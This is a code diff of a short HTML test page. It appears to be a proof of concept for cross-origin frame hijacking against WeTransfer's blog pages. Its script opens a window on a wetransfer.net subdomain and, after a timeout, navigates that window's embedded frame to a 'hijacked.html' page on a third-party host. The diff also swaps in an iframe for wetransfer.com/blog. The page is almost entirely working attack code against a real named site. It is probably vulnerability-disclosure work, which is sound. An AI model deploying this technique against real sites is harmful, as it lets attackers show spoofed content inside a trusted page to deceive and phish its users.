@@ -7,11 +7,17 @@
 </head>
 <body>
     <h1>Test</h1>
-    <iframe name="myframe" src="https://frontsite-nextjs.wetransfer.net/blog" width="1000" height="400"></iframe>
     <button onclick="openNewTab()">Open New Tab</button>
+
+    
+    <iframe name="myframe" src="https://wetransfer.com/blog" width="1000" height="400"></iframe>
+
+    <!-- <iframe name="myframe" src="https://frontsite-nextjs.wetransfer.net/blog" width="1000" height="400"></iframe> -->
+    <!-- <button onclick="openNewTab()">Open New Tab</button> -->
     <script>
         function openNewTab() {
             var x = window.open("https://frontsite-nextjs.wetransfer.net/blog", "myframe");
+
             setTimeout(function() {
                 x.frames[0].location.href = "https://daemoon.me/demo/hijacked.html";
             }, 3000);
